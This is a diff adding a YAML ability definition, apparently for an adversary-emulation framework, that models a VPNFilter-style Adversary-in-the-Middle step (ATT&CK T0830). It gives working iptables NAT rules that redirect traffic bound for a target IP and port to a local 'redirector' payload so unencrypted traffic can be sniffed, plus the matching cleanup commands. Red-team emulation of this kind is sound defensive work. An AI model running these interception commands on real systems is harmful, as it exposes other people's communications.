@@ -1,0 +1,40 @@
+---
+
+- id: 886731d5-fbe9-42c6-a0cd-f537607ba1be
+  name: Traffic Redirection
+  description: |
+    Packet Redirection
+
+    Packet redirects can be used when the adversary has a presence on a device
+    that is an endpoint of a target communication stream it wants to intercept
+    traffic from. It does so by using a local capability like iptables (living
+    off the land) to redirect packets destined for a particular destination port
+    to a port associated with a service the adversary controls.
+
+    We will be using iptables, similar to how VPNFilter did, to redirect packets
+    to a service we control with the goal of sniffing the contents of
+    unencrypted traffic to then use in other abilities later.
+  tactic: collection
+  technique:
+    attack_id: T0830
+    name: Adversary-in-the-Middle
+  repeatable: false
+  platforms:
+    linux:
+      sh:
+        command: |
+          iptables -A INPUT -p tcp --dport #{redirector.local.port} -j ACCEPT
+          iptables -t nat -A OUTPUT -d #{redirector.remote.ip}/32 -p tcp \
+            --dport #{redirector.remote.port} -m mark ! --mark 45 -j REDIRECT \
+            --to-port #{redirector.local.port}
+
+          redirector :#{redirector.local.port}:#{redirector.remote.ip}:#{redirector.remote.port}
+        cleanup: |
+          pkill redirector
+
+          iptables -t nat -D OUTPUT -d #{redirector.remote.ip}/32 -p tcp \
+            --dport #{redirector.remote.port} -m mark ! --mark 45 -j REDIRECT \
+            --to-port #{redirector.local.port}
+          iptables -D INPUT -p tcp --dport #{redirector.local.port} -j ACCEPT
+        payloads:
+        - redirector
